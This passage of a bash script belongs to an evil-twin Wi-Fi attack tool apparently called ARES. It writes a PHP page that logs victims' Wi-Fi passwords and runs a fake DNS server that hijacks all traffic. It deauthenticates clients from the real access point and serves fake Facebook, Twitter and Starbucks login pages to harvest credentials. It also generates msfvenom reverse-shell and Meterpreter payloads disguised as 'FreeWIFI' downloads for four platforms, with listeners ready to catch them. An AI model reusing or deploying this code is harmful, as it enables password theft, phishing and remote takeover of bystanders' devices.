\$pwlog = fopen(\$attemptlog, \"w\");
fwrite(\$pwlog,\"\$f_data\");
fwrite(\$pwlog,\"\n\");
fclose(\$pwlog);


if ( (strlen(\$key1) < 8) ) {
echo \"<script type=\\\"text/javascript\\\">alert(\\\"$DIALOG_WEB_LENGHT_MIN\\\");window.history.back()</script>\";
break;
}

if ( (strlen(\$key1) > 63) ) {
echo \"<script type=\\\"text/javascript\\\">alert(\\\"$DIALOG_WEB_LENGHT_MAX\\\");window.history.back()</script>\";
break;
}


\$file = fopen(\$filename, \"w\");
fwrite(\$file,\"\$f_data\");
fwrite(\$file,\"\n\");
fclose(\$file);


\$archivo = fopen(\$intento, \"w\");
fwrite(\$archivo,\"\n\");
fclose(\$archivo);

while(1)
{

if (file_get_contents(\"\$intento\") == 2) {
	    top(\"location:final.html\");
	    break;
	}
if (file_get_contents(\"\$intento\") == 1) {
	    top(\"location:error.html\");
	    unlink(\$intento);
	    break;
	}

sleep(1);
}

?>" > $DUMP_PATH/data/check.php

# Config DHCP
echo "authoritative;

default-lease-time 600;
max-lease-time 7200;

subnet $RANG_IP.0 netmask 255.255.255.0 {

option broadcast-address $RANG_IP.255;
option routers $IP;
option subnet-mask 255.255.255.0;
option domain-name-servers $IP;

range $RANG_IP.100 $RANG_IP.250;

}
" >$DUMP_PATH/dhcpd.conf

#create an empty leases file
touch $DUMP_PATH/dhcpd.leases

# creates Lighttpd web-server
echo "server.document-root = \"$DUMP_PATH/data/\"

server.modules = (
  \"mod_access\",
  \"mod_alias\",
  \"mod_accesslog\",
  \"mod_fastcgi\",
  \"mod_redirect\",
  \"mod_rewrite\"
)

fastcgi.server = ( \".php\" => ((
		  \"bin-path\" => \"/usr/bin/php-cgi\",
		  \"socket\" => \"/php.socket\"
		)))

server.port = 80
server.pid-file = \"/var/run/lighttpd.pid\"
# server.username = \"www\"
# server.groupname = \"www\"

mimetype.assign = (
\".html\" => \"text/html\",
\".htm\" => \"text/html\",
\".txt\" => \"text/plain\",
\".jpg\" => \"image/jpeg\",
\".png\" => \"image/png\",
\".css\" => \"text/css\"
)


server.error-handler-404 = \"/\"

static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
index-file.names = ( \"index.htm\" )


#Redirect www.domain.com to domain.com
\$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
}

" >$DUMP_PATH/lighttpd.conf

# that redirects all DNS requests to the gateway
echo "import socket

class DNSQuery:
  def __init__(self, data):
    self.data=data
    self.dominio=''

    tipo = (ord(data[2]) >> 3) & 15
    if tipo == 0:
      ini=12
      lon=ord(data[ini])
      while lon != 0:
	self.dominio+=data[ini+1:ini+lon+1]+'.'
	ini+=lon+1
	lon=ord(data[ini])

  def respuesta(self, ip):
    packet=''
    if self.dominio:
      packet+=self.data[:2] + \"\x81\x80\"
      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
      packet+=self.data[12:]
      packet+='\xc0\x0c'
      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.')))
    return packet

if __name__ == '__main__':
  ip='$IP'
  print 'pyminifakeDaresassNS:: dom.query. 60 IN A %s' % ip

  udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  udps.bind(('',53))

  try:
    while 1:
      data, addr = udps.recvfrom(1024)
      p=DNSQuery(data)
      udps.sendto(p.respuesta(ip), addr)
      print 'Request: %s -> %s' % (p.dominio, ip)
  except KeyboardInterrupt:
    print 'Finalizando'
    udps.close()
" >$DUMP_PATH/fakedns
chmod +x $DUMP_PATH/fakedns

}

# Set up DHCP / WEB server
function routear {

	ifconfig $interfaceroutear up
	ifconfig $interfaceroutear $IP netmask 255.255.255.0

	route add -net $RANG_IP.0 netmask 255.255.255.0 gw $IP
	sysctl -w net.ipv4.ip_forward=1 &>$ares_output_device

	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	iptables -P FORWARD ACCEPT

	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
	iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $IP:80
	iptables -t nat -A POSTROUTING -j MASQUERADE
}

# Attack
function attack {

	if [ "$fakeapmode" = "hostapd" ]; then
		interfaceroutear=$WIFI
	elif [ "$fakeapmode" = "airbase-ng" ]; then
		interfaceroutear=at0
	fi

	handshakecheck
	nomac=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 |head -n100 | grep -v "${mac:13:1}" | head -c 1)

	if [ "$fakeapmode" = "hostapd" ]; then

		ifconfig $WIFI down
		sleep 0.4
		macchanger --mac=${mac::13}$nomac${mac:14:4} $WIFI &> $ares_output_device
		sleep 0.4
		ifconfig $WIFI up
		sleep 0.4
	fi


	if [ $fakeapmode = "hostapd" ]; then
		killall hostapd &> $ares_output_device
		xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e hostapd $DUMP_PATH/hostapd.conf &
		elif [ $fakeapmode = "airbase-ng" ]; then
		killall airbase-ng &> $ares_output_device
		xterm $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e airbase-ng -P -e $Host_SSID -c $Host_CHAN -a ${mac::13}$nomac${mac:14:4} $WIFI_MONITOR &
	fi
	sleep 5

	routear &
	sleep 3


	killall dhcpd &> $ares_output_device
	xterm -bg black -fg green $TOPLEFT -T DHCP -e "dhcpd -d -f -lf "$DUMP_PATH/dhcpd.leases" -cf "$DUMP_PATH/dhcpd.conf" $interfaceroutear 2>&1 | tee -a $DUMP_PATH/clientes.txt" &
	killall $(netstat -lnptu | grep ":53" | grep "LISTEN" | awk '{print $7}' | cut -d "/" -f 2) &> $ares_output_device
	xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKEDNS" -e python $DUMP_PATH/fakedns &

	killall $(netstat -lnptu | grep ":80" | grep "LISTEN" | awk '{print $7}' | cut -d "/" -f 2) &> $ares_output_device
	lighttpd -f $DUMP_PATH/lighttpd.conf &> $ares_output_device

	killall aireplay-ng &> $ares_output_device
	killall mdk3 &> $ares_output_device
	echo "$(strings $DUMP_PATH/dump-02.csv | cut -d "," -f1,14 | grep -h "$Host_SSID" | cut -d "," -f1)" >$DUMP_PATH/mdk3.txt
	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauth all [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &

	xterm -hold $TOPRIGHT -title "Wifi Information" -e $DUMP_PATH/handcheck &

  # Generate payload for sites
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=404 -f elf > $DUMP_PATH/FreeWIFI.elf &> $ares_output_device
  msfvenom -p windows/shell_bind_tcp LHOST=192.168.1.1 LPORT=404 -f raw -e x86/shikata_ga_nai -i 10 | msfvenom -a x86  --platform windows -e x86/countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/jmp_call_additive -i 1|msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 1 | msfvenom  -a x86 --platform windows -e x86/shikata_ga_nai -i 1 -f exe -o $DUMP_PATH//FreeWIFI.exe &> $ares_output_device
  msfvenom -p android/meterpreter/reverse_http LHOST=192.168.1.1 LPORT=404 R > $DUMP_PATH/FreeWIFI.apk &> $ares_output_device
  msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.1.1 LPORT=404 -f macho > $DUMP_PATH/FreeWIFI.macho &> $ares_output_device

  ################################## < LINUX > ##################################
  sudo rm -rf $DUMP_PATH/payloadLinux.rc
  touch $DUMP_PATH/payloadLinux.rc
  echo "use exploit/multi/handler" > $DUMP_PATH/payloadLinux.rc
  echo "set PAYLOAD linux/x86/meterpreter/reverse_tcp" >> $DUMP_PATH/payloadLinux.rc
  echo "set LHOST 192.168.1.1" >> $DUMP_PATH/payloadLinux.rc
  echo "set LPORT 404" >> $DUMP_PATH/payloadLinux.rc
  echo "set ExitOnSession false" >> $DUMP_PATH/payloadLinux.rc
  echo "exploit -j"  >> $DUMP_PATH/payloadLinux.rc

  xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Mfsconsole" -e msfconsole -r "$DUMP_PATH/payloadLinux.rc" &
  ################################## < WINDOWS > ##################################

  sudo rm -rf $DUMP_PATH/payloadWindows.rc
  touch $DUMP_PATH/payloadWindows.rc

  echo "use exploit/multi/handler" > $DUMP_PATH/payloadWindows.rc
  echo "set PAYLOAD windows/shell_bind_tcp" >> $DUMP_PATH/payloadWindows.rc
  echo "set LHOST 192.168.1.1" >> $DUMP_PATH/payloadWindows.rc
  echo "set LPORT 404" >> $DUMP_PATH/payloadWindows.rc
  echo "set ExitOnSession false" >> $DUMP_PATH/payloadWindows.rc
  echo "exploit -j"  >> $DUMP_PATH/payloadWindows.rc

  xterm $HOLD $TOPLEFT -bg "#000000" -fg "#FF0009" -title "Mfsconsole" -e msfconsole -r "$DUMP_PATH/payloadWindows.rc" &

  ################################## < MAC > ##################################

  sudo rm -rf $DUMP_PATH/payloadMac.rc
  touch $DUMP_PATH/payloadMac.rc

  echo "use exploit/multi/handler" > $DUMP_PATH/payloadMac.rc
  echo "set PAYLOAD osx/x86/shell_reverse_tcp" >> $DUMP_PATH/payloadMac.rc
  echo "set LHOST 192.168.1.1" >> $DUMP_PATH/payloadMac.rc
  echo "set LPORT 404" >> $DUMP_PATH/payloadMac.rc
  echo "set ExitOnSession false" >> $DUMP_PATH/payloadMac.rc
  echo "exploit -j"  >> $DUMP_PATH/payloadMac.rc

  xterm $HOLD $TOPRIGHT -bg "#000000" -fg "#FF0009" -title "Mfsconsole" -e  msfconsole -r "$DUMP_PATH/payloadMac.rc" &

  ################################## < ANDROID > ##################################

  sudo rm -rf $DUMP_PATH/payloadAndroid.rc
  touch $DUMP_PATH/payloadAndroid.rc

  echo "use exploit/multi/handler" > $DUMP_PATH/payloadAndroid.rc
  echo "set PAYLOAD android/meterpreter/reverse_http" >> $DUMP_PATH/payloadAndroid.rc
  echo "set LHOST 192.168.1.1" >> $DUMP_PATH/payloadAndroid.rc
  echo "set LPORT 404" >> $DUMP_PATH/payloadAndroid.rc
  echo "set ExitOnSession false" >> $DUMP_PATH/payloadAndroid.rc
  echo "exploit -j"  >> $DUMP_PATH/payloadAndroid.rc

  xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#FF0009" -title "Mfsconsole" -e  msfconsole -r "$DUMP_PATH/payloadAndroid.rc" &

  ################################## < MAC > ##################################
  conditional_clear

	while true; do
		top

		echo "Attack in progress .. 192.168.1.1"
		echo "                                       "
		echo "		1) Choose another network"
		echo "		2) Exit"
		echo " "
		echo -n '      #> '
		read yn
		case $yn in
			1 ) matartodo; CSVDB=dump-01.csv; selection; break;;
			2 ) matartodo; exitmode; break;;
			* ) echo "
$general_case_error"; conditional_clear ;;
		esac
	done

}


# Checks the validity of the password
function handshakecheck {

	echo "#!/bin/bash

	echo > $DUMP_PATH/data.txt
	echo -n \"0\"> $DUMP_PATH/hit.txt
	echo "" >$DUMP_PATH/loggg

	tput civis
	clear

	minutos=0
	horas=0
	i=0
	timestamp=\$(date +%s)

	while true; do

	segundos=\$i
	dias=\`expr \$segundos / 86400\`
	segundos=\`expr \$segundos % 86400\`
	horas=\`expr \$segundos / 3600\`
	segundos=\`expr \$segundos % 3600\`
	minutos=\`expr \$segundos / 60\`
	segundos=\`expr \$segundos % 60\`

	if [ \"\$segundos\" -le 9 ]; then
	is=\"0\"
	else
	is=
	fi

	if [ \"\$minutos\" -le 9 ]; then
	im=\"0\"
	else
	im=
	fi

	if [ \"\$horas\" -le 9 ]; then
	ih=\"0\"
	else
	ih=
	fi">>$DUMP_PATH/handcheck


	echo "readarray -t CLIENTESDHCP < <(nmap -PR -sn -n -oG - $RANG_IP.100-110 2>&1 | grep Host )

	echo
	echo -e \"  ACCESS POINT:\"
	echo -e \"    SSID............: "$white"$Host_SSID"$transparent"\"
	echo -e \"    MAC.............: "$yellow"$Host_MAC"$transparent"\"
	echo -e \"    Channel.........: "$white"$Host_CHAN"$transparent"\"
	echo -e \"    Vendor..........: "$green"$Host_MAC_MODEL"$transparent"\"
	echo -e \"    Operation time..: "$blue"\$ih\$horas:\$im\$minutos:\$is\$segundos"$transparent"\"
	echo -e \"    Attempts........: "$red"\$(cat $DUMP_PATH/hit.txt)"$transparent"\"
	echo -e \"    Clients.........: "$blue"\$(cat $DUMP_PATH/clientes.txt | grep DHCPACK | awk '{print \$5}' | sort| uniq | wc -l)"$transparent"\"
	echo
	echo -e \"  CLIENTS ONLINE:\"

	x=0
	for cliente in \"\${CLIENTESDHCP[@]}\"; do
	  x=\$((\$x+1))
	  CLIENTE_IP=\$(echo \$cliente| cut -d \" \" -f2)
	  CLIENTE_MAC=\$(nmap -PR -sn -n \$CLIENTE_IP 2>&1 | grep -i mac | awk '{print \$3}' | tr [:upper:] [:lower:])

	  if [ \"\$(echo \$CLIENTE_MAC| wc -m)\" != \"18\" ]; then
		CLIENTE_MAC=\"xx:xx:xx:xx:xx:xx\"
	  fi

	  CLIENTE_FABRICANTE=\$(macchanger -l | grep \"\$(echo \"\$CLIENTE_MAC\" | cut -d \":\" -f -3)\" | cut -d \" \" -f 5-)

	  if echo \$CLIENTE_MAC| grep -q x; then
		    CLIENTE_FABRICANTE=\"unknown\"
	  fi

	  CLIENTE_HOSTNAME=\$(grep \$CLIENTE_IP $DUMP_PATH/clientes.txt | grep DHCPACK | sort | uniq | head -1 | grep '(' | awk -F '(' '{print \$2}' | awk -F ')' '{print \$1}')

	  echo -e \"    $green \$x) $red\$CLIENTE_IP $yellow\$CLIENTE_MAC $transparent($blue\$CLIENTE_FABRICANTE$transparent) $green \$CLIENTE_HOSTNAME$transparent\"
	done

	echo -ne \"\033[K\033[u\"">>$DUMP_PATH/handcheck


	if [ $authmode = "hostapdAP" ]; then
		echo "let i=\$(date +%s)-\$timestamp
		sleep 1">>$DUMP_PATH/handcheck

	elif [ $authmode = "wpa_supplicant" ]; then
		echo "sleep 5

		killall wpa_supplicant &>$ares_output_device
		killall wpa_passphrase &>$ares_output_device
		let i=\$i+5">>$DUMP_PATH/handcheck
	fi

	echo "done
	clear
	echo \"1\" > $DUMP_PATH/status.txt

	sleep 7

	killall mdk3 &>$ares_output_device
	killall aireplay-ng &>$ares_output_device
	killall airbase-ng &>$ares_output_device
	kill \$(ps a | grep python| grep fakedns | awk '{print \$1}') &>$ares_output_device
	killall hostapd &>$ares_output_device
	killall lighttpd &>$ares_output_device
	killall dhcpd &>$ares_output_device
	killall wpa_supplicant &>$ares_output_device
	killall wpa_passphrase &>$ares_output_device

	echo \"
	ARES $version by deltax & princeofguilty

	SSID: $Host_SSID
	BSSID: $Host_MAC ($Host_MAC_MODEL)
	Channel: $Host_CHAN
	Security: $Host_ENC
	Time: \$ih\$horas:\$im\$minutos:\$is\$segundos
	Password: \$(cat $DUMP_PATH/data.txt)
	\" >\"$HOME/$Host_SSID-password.txt\"">>$DUMP_PATH/handcheck


	if [ $authmode = "handshake" ]; then
		echo "aircrack-ng -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $DUMP_PATH/data.txt && echo && echo -e \"The password was saved in "$red"$HOME/$Host_SSID-password.txt"$transparent"\"
		">>$DUMP_PATH/handcheck

	elif [ $authmode = "wpa_supplicant" ]; then
		echo "echo -e \"The password was saved in "$red"$HOME/$Host_SSID-password.txt"$transparent"\"">>$DUMP_PATH/handcheck
	fi

	echo "kill -INT \$(ps a | grep bash| grep ares | awk '{print \$1}') &>$ares_output_device">>$DUMP_PATH/handcheck
	chmod +x $DUMP_PATH/handcheck
}


############################################# < ATTACK > ############################################






############################################## < STUFF > ############################################

# Deauth all
function deauthall {

	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $Host_SSID" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
}

function deauthmdk3 {

	echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating via mdk3 all clients on $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
	mdk3PID=$!
}

# Deauth to a specific target
function deauthesp {

	sleep 2
	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating client $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI_MONITOR &
}

# Close all processes
function matartodo {

	killall aireplay-ng &>$ares_output_device
	kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$ares_output_device
	killall hostapd &>$ares_output_device
	killall lighttpd &>$ares_output_device
	killall dhcpd &>$ares_output_device
	killall xterm &>$ares_output_device

}
function Tcpdump {

	echo "$Host_MAC" >$DUMP_PATH/tcpdump.txt
	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Using tcpdump on all clients on $Host_SSID" -e tcpdump -XX -i $WIFI_MONITOR -w /root/$host_ssid-ares.pcap

}

function topusers {
echo -e " "
echo -e " _ _ _ "
 echo -e " /   \ __ _ _// _/ "
 echo -e " / /\  |       /| )_ ___ \ "
 echo -e " / | \ | | / \ "
 echo -e " __| /|  /__ /___ / "
 echo -e " / / / / "
 echo -e " "
}
# Create a Facebook login page
function Facebook {
mkdir $DUMP_PATH/data &>$ares_output_device
        cp  $WORK_DIR/Sites/Facebook/config.ini $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/data.php $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/facebook-logo.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/font-awesome.min.css $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/index.htm $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/index.js $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/jquery.min.js $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/oauth.html $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/reset.css $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/roboto.css $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/style.css $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/datasms.php $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/smscode.htm $DUMP_PATH/data
		cp  $WORK_DIR/Sites/Facebook/Facebookusers.txt $DUMP_PATH/data

[ -f /root/Facebookusers.txt ] || cp  $WORK_DIR/Sites/Facebook/Facebookusers.txt /root/Facebookusers.txt && echo  >> /root/Facebookusers.txt && echo -e "                                                         "  >> /root/Facebookusers.txt && echo -e "                                                           _____ _____________________ _________  "  >> /root/Facebookusers.txt && echo -e "                                                          /  _  \\ _____   \_   _____//   _____/  "  >> /root/Facebookusers.txt && echo -e "                                                         /  /_\  \|       _/|    __)_ \_____  \   "  >> /root/Facebookusers.txt && echo -e "                                                        /    |    \    |   \|        \/        \  "  >> /root/Facebookusers.txt && echo -e "                                                        \____|__  /____|_  /_______  /_______  /  "  >> /root/Facebookusers.txt && echo -e "                                                                \/       \/        \/        \/   "  >> /root/Facebookusers.txt && echo -e "                                                        " && echo -e "               by                                               princeofguilty & deltax           "  >> /root/Facebookusers.txt && echo -e "            "  >> /root/Facebookusers.txt && echo -e " Network ssid : $Host_SSID"  >> /root/Facebookusers.txt
}
function Starbucks {
mkdir $DUMP_PATH/data &>$ares_output_device
	unzip $WORK_DIR/Sites/Starbucks/Starbucks.zip -d $DUMP_PATH/data

[ -f /root/Facebookusers.txt ] || cp  $WORK_DIR/Sites/Facebook/Facebookusers.txt /root/Facebookusers.txt && echo  >> /root/Facebookusers.txt && echo -e "                                                         "  >> /root/Facebookusers.txt && echo -e "                                                           _____ _____________________ _________  "  >> /root/Facebookusers.txt && echo -e "                                                          /  _  \\ _____   \_   _____//   _____/  "  >> /root/Facebookusers.txt && echo -e "                                                         /  /_\  \|       _/|    __)_ \_____  \   "  >> /root/Facebookusers.txt && echo -e "                                                        /    |    \    |   \|        \/        \  "  >> /root/Facebookusers.txt && echo -e "                                                        \____|__  /____|_  /_______  /_______  /  "  >> /root/Facebookusers.txt && echo -e "                                                                \/       \/        \/        \/   "  >> /root/Facebookusers.txt && echo -e "                                                        " && echo -e "               by                                               princeofguilty & deltax           "  >> /root/Facebookusers.txt && echo -e "            "  >> /root/Facebookusers.txt && echo -e " Network ssid : $Host_SSID"  >> /root/Facebookusers.txt
}
function Twitter {
mkdir $DUMP_PATH/data &>$ares_output_device
        cp  $WORK_DIR/Sites/Twitter/config.ini $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Twitter/data.php $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Twitter/twitterlogo.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Twitter/font-awesome.min.css $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Twitter/index.htm $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Twitter/index.js $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Twitter/jquery.min.js $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Twitter/oauth.html $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Twitter/reset.css $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Twitter/roboto.css $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Twitter/style.css $DUMP_PATH/data
	cp  $WORK_DIR/Sites/Twitter/Twitterusers.txt $DUMP_PATH/data

[ -f /root/Twitterusers.txt ] || cp  $WORK_DIR/Sites/Twitter/Twitterusers.txt /root/Twitterusers.txt && echo  >> /root/Twitterusers.txt && echo -e "                                                         "  >> /root/Twitterusers.txt && echo -e "                                                           _____ _____________________ _________  "  >> /root/Twitterusers.txt && echo -e "                                                          /  _  \\ _____   \_   _____//   _____/  "  >> /root/Twitterusers.txt && echo -e "                                                         /  /_\  \|       _/|    __)_ \_____  \   "  >> /root/Twitterusers.txt && echo -e "                                                        /    |    \    |   \|        \/        \  "  >> /root/Twitterusers.txt && echo -e "                                                        \____|__  /____|_  /_______  /_______  /  "  >> /root/Twitterusers.txt && echo -e "                                                                \/       \/        \/        \/   "  >> /root/Twitterusers.txt && echo -e "                                                        " && echo -e "                                                             by princeofguilty & deltax           "  >> /root/Twitterusers.txt && echo -e "            "  >> /root/Twitterusers.txt && echo -e " Network ssid : $Host_SSID"  >> /root/Twitterusers.txt

}
function Customweb {
	echo -e "Users will be found at Aresusers.txt"
mkdir $DUMP_PATH/data &>$ares_output_device
	unzip $WORK_DIR/Sites/Customwebsite/website.zip -d $DUMP_PATH/data

[ -f /root/Aresuser.txt ] || cp  $WORK_DIR/Sites/Twitter/Aresuser.txt /root/Aresuser.txt && echo  >> /root/Aresuser.txt && echo -e "                                                         "  >> /root/Aresuser.txt && echo -e "                                                           _____ _____________________ _________  "  >> /root/Aresuser.txt && echo -e "                                                          /  _  \\ _____   \_   _____//   _____/  "  >> /root/Aresuser.txt && echo -e "                                                         /  /_\  \|       _/|    __)_ \_____  \   "  >> /root/Aresuser.txt && echo -e "                                                        /    |    \    |   \|        \/        \  "  >> /root/Aresuser.txt && echo -e "                                                        \____|__  /____|_  /_______  /_______  /  "  >> /root/Aresuser.txt && echo -e "                                                                \/       \/        \/        \/   "  >> /root/Aresuser.txt && echo -e "                                                        " && echo -e "                                                             by princeofguilty & deltax           "  >> /root/Aresuser.txt && echo -e "            "  >> /root/Aresuser.txt && echo -e " Network ssid : $Host_SSID"  >> /root/Aresuser.txt
}

######################################### < INTERFACE WEB > ########################################


top&& setresolution && setinterface
